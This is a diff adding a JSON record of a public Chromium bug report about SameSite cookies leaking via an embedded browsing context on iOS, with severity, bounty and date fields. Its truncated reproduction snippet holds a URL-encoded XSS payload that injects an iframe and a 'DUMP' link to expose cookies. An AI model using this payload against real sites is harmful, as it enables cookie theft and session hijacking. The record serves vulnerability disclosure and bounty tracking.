@@ -1,0 +1,29 @@
+{
+  "id": "40057831",
+  "url": "https://issues.chromium.org/issues/40057831",
+  "title": "SameSite cookies leak via embedded browsing context",
+  "status": "Assigned",
+  "severity": "S3-Low",
+  "priority": "P2",
+  "component": "Internals>Network>Cookies",
+  "os_platforms": [
+    "iOS"
+  ],
+  "chrome_version": null,
+  "cve_ids": [],
+  "reporter": "pr...@gmail.com",
+  "assignee": "bi...@chromium.org",
+  "created_date": "2021-11-05T17:11:31+00:00",
+  "modified_date": "2024-01-09T04:16:10+00:00",
+  "public_issue": true,
+  "bounty_confirmed": true,
+  "bounty_amount": 500.0,
+  "reward_amount_meta": 500.0,
+  "inclusion_reason": "reward_amount_meta",
+  "award_text_found": false,
+  "award_text_source_update": null,
+  "bounty_rationale": null,
+  "attachments": [],
+  "update_count": 34,
+  "description_snippet": "Steps to reproduce the problem:\r\n### Reproduction Steps\r\n1. Visit https://cm2.pw/cookies?url=/?xss=%3Ciframe+src=%22https://egesuite.net/?q=%3Ca+href=//raw.cm2.pw%3EDUMP%22+style=%22height:750px;width:750px%22%3E%3C/iframe%3E\r\n\r\n2. Click on DUMP\r\n3. Notice cookies which include also includes Lax & S"
+}
